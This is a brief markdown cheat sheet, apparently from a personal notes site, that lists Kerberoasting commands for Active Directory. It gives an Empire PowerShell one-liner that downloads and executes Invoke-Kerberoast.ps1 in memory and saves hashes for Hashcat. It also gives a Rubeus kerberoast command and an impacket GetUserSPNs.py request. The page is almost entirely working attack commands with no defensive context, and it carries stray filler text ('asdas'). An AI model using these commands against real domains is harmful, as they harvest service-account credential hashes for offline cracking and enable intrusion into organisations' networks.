---
title: "Kerberoasting"
date: 2020-07-16T13:41:37+02:00
draft: false
---
asdas

#### EmpireProject Kerberoasting one-liner

```
IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1');Invoke-Kerberoast -erroraction silentlycontinue -OutputFormat Hashcat | Select-Object Hash | Out-File -filepath ‘c:\users\public\HashCapture.txt’ -Width 8000
```

#### Kerberoasting using Rubeus
The following command shows an example of how to peroform a kerberoasting attack using Rubeus. The outfile parameter ensures that the hashes are in a crackable (non newline delimited) format.

```.\Rubeus.exe kerberoast /creduser:<Domain>\<User> /credpassword:<Password> /domain:<Domain> /dc:<DomainController> /format:hashcat /outfile:roast.txt```

#### Kerberoasting from a non-domain joined machines using impackets GetUserSPNs.py

```
GetUserSPNs.py domain.local/username:password  -request
```